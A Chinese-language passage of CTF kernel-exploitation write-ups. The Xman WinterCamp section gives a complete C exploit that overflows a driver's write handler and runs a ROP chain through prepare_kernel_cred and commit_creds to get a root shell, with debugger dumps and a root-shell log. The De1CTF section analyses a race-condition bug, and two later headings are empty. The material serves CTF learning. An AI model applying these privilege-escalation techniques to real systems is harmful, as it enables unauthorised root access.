    memset(payload, 0 ,payload_len);
    payload_len = 0;

    // rop chain
    join_data(prdi);
    join_data(0);
    join_data(prepare_kernel_cred);
    join_data(poprcx);
    join_data(0);
    join_data(rax2rdi);
    join_data(commit_creds);
    join_data(poprbp);
    join_data(user_stack + 0x100);
    join_data(swapgs);
    join_data(user_rflags);
    join_data(iretq);
    join_data(0);
    join_data(user_cs);
    join_data(user_rflags);
    join_data(user_stack);
    join_data(user_ss);

    write(fd, payload, payload_len);
    close(fd);
    
}
```

# 2020 Xman WinterCamp

## 驱动环境

```shell
qemu-system-x86_64 \
-m 256M \
-kernel ./bzImage \
-initrd ./core.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr" \
-cpu qemu64,+smep,+smap -nographic -monitor /dev/null
```

未开启kaslr，有smap与smep，无法在ring 0级别访问用户态

```tex
/ $ uname -a
Linux (none) 4.8.1 #1 SMP Sun Dec 1 19:44:19 CST 2019 x86_64 GNU/Linux
```

## 驱动分析

```c
signed __int64 mychardev_init()
{
  __int64 space; // rax
  signed __int64 result; // rax
  signed __int64 count; // rcx
  _DWORD *pointer; // rdi
  unsigned int v4; // ebx

  space = kmalloc_order_trace(0x10010LL, 0x24000C0LL, 5LL);
  mydata = space;
  if ( space )
  {
    count = 0x4004LL;
    pointer = (_DWORD *)space;
    while ( count )
    {
      *pointer = 0;
      ++pointer;
      --count;
    }
    v4 = misc_register(&my_miscdev);
    if ( v4 )
    {
      printk("cannot register miscdev on minor=11 (err=%d)\n");
      result = v4;
    }
    else
    {
      printk("misc device mychrdev is registered.\n");
      result = 0LL;
    }
  }
  else
  {
    printk("cannot allocate memory\n");
    result = 0xFFFFFFFFLL;
  }
  return result;
}
```

驱动一开始申请了0x10010的内存空间，接着全部置0

```c
signed __int64 mychrdev_write()
{
  char v1; // [rsp+0h] [rbp-50h]

  if ( copy_from_user(&v1) )
    return -14LL;
  printk("You writed!");
  return 1LL;
}
```

write功能从用户态读取数据到栈上，存在栈溢出

```c
signed __int64 __fastcall mychrdev_read(__int64 a1, __int64 a2, signed __int64 a3, _QWORD *a4)
{
  __int64 user_land_address; // rdi
  signed __int64 result; // rax
  __int64 v6; // rsi
  signed __int64 size; // rbx
  __int64 v8; // rdx
  unsigned __int64 different; // r8
  _QWORD *v10; // r12

  user_land_address = a2;
  result = 0LL;
  v6 = *(_QWORD *)(mydata + 0x10000);           // 读取0x10000处的值
  size = a3;
  v8 = *a4;
  different = *(_QWORD *)(mydata + 0x10008) - v6;// 0x10008处的值-0x10000处的值
  if ( (signed __int64)different > *a4 )        // 比较different与传进的地址处的值
  {
    v10 = a4;
    if ( v8 + size > different )
      size = different - v8;                    // size的限制
    if ( copy_to_user(user_land_address, mydata + v6 + v8, (unsigned int)size) )
    {
      result = -14LL;
    }
    else
    {
      *v10 += size;
      result = size;
    }
  }
  return result;
}
```

read功能读到mydata中的内容

```c
unsigned __int64 __fastcall mychrdev_unlocked_ioctl(__int64 a1, int a2, __int64 a3)
{
  const char *v3; // rax
  __int64 user_land_address; // r12
  const void *v5; // rbx
  size_t v6; // rax
  __int64 v7; // rax
  int v8; // ecx
  int v10; // [rsp-40h] [rbp-40h]
  int v11; // [rsp-3Ch] [rbp-3Ch]
  int v12; // [rsp-2Ch] [rbp-2Ch]
  int v13; // [rsp-28h] [rbp-28h]
  __int64 v14; // [rsp-20h] [rbp-20h]

  v3 = *(const char **)(a1 + 0xD0);
  if ( a2 != 0x1111 )
    return -22LL;
  user_land_address = a3;
  v5 = v3 + 4;
  v10 = *(_DWORD *)v3;
  v6 = strlen(v3 + 4);
  memcpy(&v11, v5, v6 + 1);
  v7 = *(_QWORD *)(mydata + 0x10008);
  v14 = mydata;
  v8 = 0x10000 - v7;
  LODWORD(v7) = v7 - *(_DWORD *)(mydata + 0x10000);
  v12 = v8;
  v13 = v7;
  return -(signed __int64)((unsigned __int64)copy_to_user(user_land_address, &v10, 40LL) >= 1) & 0xFFFFFFFFFFFFFFF2LL;
}
```

iotcl提供一个0x1111的功能，貌似只是读取a1+0xd0的40个字节，其余的貌似没有什么实际用途

## 驱动利用

依然write功能有溢出，看看能否直接ROP

```tex
──────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────
 RAX  0xffffffffa0000090 (mychrdev_write) ◂— push   rbp /* 0x50ec8348e5894855 */
 RBX  0xffff88000d5d8600 ◂— 0
 RCX  0xffff88000d683f20 ◂— 0
 RDX  0x60
 RDI  0xffff88000d683df8 —▸ 0xffff88000d63d021 ◂— insd   dword ptr [rdi], dx /* 0x766564726863796d;
 'mychrdev' */
 RSI  0x6ccd80 ◂— 0
 R8   0x6ccde0 ◂— 0
 R9   0xffff88000d60f568 ◂— jmp    qword ptr [rcx] /* 0x521ff */
 R10  0x6c9f20 ◂— 0x6
 R11  0x246
 R12  0xffff88000d683f20 ◂— 0
 R13  0x6ccd80 ◂— 0
 R14  0xffff88000d5d8600 ◂— 0
 R15  0x0
 RBP  0xffff88000d683e48 —▸ 0xffff88000d683ec8 —▸ 0xffff88000d683f08 —▸ 0xffff88000d683f48 —▸ 0x7ff
e5d581590 ◂— ...
 RSP  0xffff88000d683df8 —▸ 0xffff88000d63d021 ◂— insd   dword ptr [rdi], dx /* 0x766564726863796d;
 'mychrdev' */
 RIP  0xffffffffa00000a2 (mychrdev_write+18) ◂— 0xc08548e13342b9e8
────────────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0xffffffffa000009a <mychrdev_write+10>    nop    
   0xffffffffa000009b <mychrdev_write+11>    nop    
   0xffffffffa000009c <mychrdev_write+12>    nop    
   0xffffffffa000009d <mychrdev_write+13>    nop    
   0xffffffffa000009e <mychrdev_write+14>    lea    rdi, [rbp - 0x50]
 ► 0xffffffffa00000a2 <mychrdev_write+18>    call   0xffffffff81334360
```

往栈上写0x60个0，由IDA中分析的函数堆栈，刚好覆盖到返回地址

```tex
──────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────
 RAX  0x1
 RBX  0xffff88000d5d8600 ◂— 0
 RCX  0xffffffff81e40578 ◂— 0xffffffff81e40578
 RDX  0xb
 RDI  0xffffffff8208edec ◂— add    byte ptr [rax], al /* 0x100000000 */
 RSI  0x202
 R8   0xffffffff82091260 ◂— pop    rcx /* 0x7469727720756f59; 'You writed!' */
 R9   0x2164657469727720 (' writed!')
 R10  0x0
 R11  0x15c
 R12  0xffff88000d683f20 ◂— 0
 R13  0x6ccd80 ◂— 0
 R14  0xffff88000d5d8600 ◂— 0
 R15  0x0
 RBP  0x0
 RSP  0xffff88000d683e50 ◂— 0
 RIP  0xffffffffa00000f0 (mychrdev_write+96) ◂— ret     /* 0x2e660000441f0fc3 */
────────────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0xffffffffa00000aa <mychrdev_write+26>    je     mychrdev_write+78 <0xffffffffa00000de>
    ↓
   0xffffffffa00000de <mychrdev_write+78>    mov    rdi, -0x5ffffe02
   0xffffffffa00000e5 <mychrdev_write+85>    call   0xffffffff811248db
 
   0xffffffffa00000ea <mychrdev_write+90>    mov    eax, 1
   0xffffffffa00000ef <mychrdev_write+95>    leave  
 ► 0xffffffffa00000f0 <mychrdev_write+96>    ret    <0>



────────────────────────────────────────────[ STACK ]─────────────────────────────────────────
00:0000│ rsp  0xffff88000d683e50 ◂— 0
```

可以发现是可以劫持返回地址的，那么就考虑ROP了

先利用extract-vmlinux从bzImage提取出vmlinux，再找相应的gadget，从/proc/kallsyms找到提权函数

```tex
0xffffffff811b771d : pop rdi ; ret
0xffffffff810779b0 : prepare_kernel_cred
0xffffffff81694878 : xchg rax, rdi ; ret
0xffffffff81077620 : commit_creds
0xffffffff818e9d88 : swapgs ; ret
0xffffffff818e8977 : iretq
```

形成ROP_CHAIN

```tex
pwndbg> stack 20
00:0000│ rsp  0xffff88000d6c7e50 —▸ 0xffffffff811b771d ◂— pop    rdi /* 0x247c8b48ffffc35f */
01:0008│      0xffff88000d6c7e58 ◂— 0
02:0010│      0xffff88000d6c7e60 —▸ 0xffffffff810779b0 ◂— 0x8948024000c0be55
03:0018│      0xffff88000d6c7e68 —▸ 0xffffffff81694878 ◂— xchg   rax, rdi /* 0x6085894481c39748 */
04:0020│      0xffff88000d6c7e70 —▸ 0xffffffff81077620 ◂— push   rbp /* 0x54415541e5894855 */
05:0028│      0xffff88000d6c7e78 —▸ 0xffffffff818e9d88 ◂— swapgs  /* 0x48c3ffc3c3f8010f */
06:0030│      0xffff88000d6c7e80 —▸ 0xffffffff818e8977 ◂— iretq   /* 0x65f8010f5750cf48 */
07:0038│      0xffff88000d6c7e88 —▸ 0x400a43 ◂— push   rbp
08:0040│      0xffff88000d6c7e90 ◂— 0x33 /* '3' */
09:0048│      0xffff88000d6c7e98 ◂— 0x202
0a:0050│      0xffff88000d6c7ea0 —▸ 0x7ffe553e2070 —▸ 0x7ffe553e2090 —▸ 0x6ca018 —▸ 0x423810 ◂— ...
0b:0058│      0xffff88000d6c7ea8 ◂— 0x2b /* '+' */
```

成功拿到root shell

```tex
➜  xman ./start.sh                                                          
warning: TCG doesn't support requested feature: CPUID.01H:ECX.vmx [bit 5]   
                                                                            
Boot took 1.42 seconds                                                      
                                                                            
/ $ id                                                                      
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)                                
/ $ cat flag                                                                
cat: can't open 'flag': Permission denied                                   
/ $ ./exp                                                                   
/ # id                                                                      
uid=0(root) gid=0(root)                                                     
/ # cat flag                                                                
flag{nothing}
```

完整EXP：

```c
//gcc exp.c -static -o exp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>

int fd;
char payload[1000];
int payload_len = 0;

#define poprdi 0xffffffff811b771d
#define prepare_kernel_cred 0xffffffff810779b0
#define xchgraxrdi 0xffffffff81694878
#define commit_creds 0xffffffff81077620
#define swapgs 0xffffffff818e9d88
#define iretq 0xffffffff818e8977

void join_data(long long data)
{
    unsigned char buf[8] = {0};
    memcpy(buf, &data, 8);
    memcpy(payload + payload_len, buf, 8);
    payload_len += 8;
}
long long user_cs, user_ss, user_rflags, user_stack;

static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        "movq %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_stack)
        :
        : "memory");
}

void launch_shell()
{
    execl("/bin/sh", "sh", NULL);
}

int main()
{
    save_state();
    fd = open("/dev/mychrdev", O_WRONLY);
    for (int i = 0; i < 11; i++)
    {
        join_data(0);
    }
    join_data(poprdi);
    join_data(0);
    join_data(prepare_kernel_cred);
    join_data(xchgraxrdi);
    join_data(commit_creds);
    join_data(swapgs);
    join_data(iretq);
    join_data(&launch_shell);
    join_data(user_cs);
    join_data(user_rflags);
    join_data(user_stack);
    join_data(user_ss);
    write(fd, payload, payload_len);
}
```

当然也可以修改cr4寄存器实现ret2usr，cr4寄存器状态：

```tex
CR4: 00000000000006f0 
CR4: 00000000001006f0 +smep
CR4: 00000000002006f0 +smap
CR4: 00000000003006f0 +smep +smap
```

# 2019 De1CTF

## 驱动环境

这一道题给的文件系统不是常见的cpio格式，而是一个ext4

```tex
rootfs.img: Linux rev 1.0 ext4 filesystem data, UUID=8ee6d402-13d4-4fb7-ac61-cbfc4f73cdd8 (extents) (large files) (huge files)
```

这种文件系统需要mount到一个文件夹上，然后在文件夹中修改，最后umount就行了

```shell
sudo mount -t ext4 -o loop rootfs.img mnt
...
sudo umount
```
开启了smep，smap，实测发现还有kaslr
```shell
#!/bin/bash

cd /home/ctf
tmp=`date +%N`
cp rootfs.img  $tmp
qemu-system-x86_64 -hda $tmp -kernel 5.0.0-bzImage -append 'console=ttyS0 root=/dev/sda rw quiet' -m 128M --nographic -cpu kvm64,+smep,+smap
rm $tmp
exit 0
```

## 驱动分析

ioctl实现了三个功能，事先先从用户态读入一个data_struct，0x23333和0x23334都会引用到这个data_struct

```c
__int64 __fastcall test_ioctl(file *filp, unsigned int cmd, unsigned __int64 arg)
{
  __int64 result; // rax
  data_struct data; // [rsp+0h] [rbp-20h]
  unsigned __int64 v5; // [rsp+10h] [rbp-10h]

  v5 = __readgsqword(0x28u);
  if ( copy_from_user(&data, arg) )
    return -22LL;
  if ( cmd == 0x23334 )
    return test_write(&data);
  if ( cmd == 0x23335 )
  {
    kfree(buffer);
    *(&buffer + 0x20000000) = 0LL;
    *(&length + 0x20000000) = 0LL;
    result = 0LL;
  }
  else
  {
    result = 0LL;
    if ( cmd == 0x23333 )
      result = test_read(&data);
  }
  return result;
}
```

```c
00000000 data_struct     struc ; (sizeof=0x10, align=0x8, copyof_575)
00000000                                         ; XREF: test_ioctl/r
00000000 size            dq ?
00000008 buf             dq ?                    ; offset
00000010 data_struct     ends
```

test_read功能首先对size进行check

- length < size < 0x400

释放掉buffer，然后重新申请一个size大小的buffer，写入数据

- size < length

直接往现有的buffer写入数据

```c
__int64 __fastcall test_read(data_struct *data)
{
  unsigned __int64 size; // rdx
  __int64 result; // rax
  char *v3; // rax
  char *v4; // rsi
  unsigned __int64 v5; // [rsp+0h] [rbp-10h]

  size = data->size;
  if ( !data->size )                            // size check
    return -22LL;
  if ( size > length && size <= 0x400 )         // length < size < 0x400
  {
    v5 = data->size;
    kfree(buffer);
    v3 = (char *)_kmalloc(v5, 6324416LL);
    buffer = v3;
    if ( v3 )
    {
      v4 = data->buf;
      length = v5;
      result = copy_from_user(v3, v4);
    }
    else
    {
      result = -12LL;
    }
  }
  else if ( size > length )
  {
    result = -22LL;
  }
  else
  {
    result = copy_from_user(buffer, data->buf); // size < length
  }
  return result;
}
```

test_write功能读出数据

```c
__int64 __fastcall test_write(data_struct *data)
{
  __int64 result; // rax

  if ( length && data->size <= length )
    result = copy_to_user(data->buf, buffer);
  else
    result = -22LL;
  return result;
}
```

第三个功能就是释放掉buffer，并且把指针置0

## 驱动利用

直接释放buffer后会置0，那么就不存在UAF的利用了，而且read/write功能也限制了长度，无法进程溢出读写

看了官方的exp，发现是使用了竞态读写（突然想起题目就是叫Race），问题是看上面的配置也没开启多核多线程，查看cpuinfo也是只有单核。。

通过test_write，在copy_to_user前释放掉buffer，就可以得到next chunk的地址，用户态程序就能得到内核堆的地址了

为了扩大竞争窗口期，mmap一块内存，这样copy_to_user的时候引发缺页中断，进程切换

```sequence
线程A->内核: test_write
Note left of 内核: check
内核->线程A: copy_to_user
Note left of 内核: 缺页中断
线程B->内核: test_del
Note right of 内核: kfree buffer
内核->线程A: copy_to_user
```







# 2015 CSAW





# 强网杯 solid_core





https://www.jianshu.com/p/3d707fac499a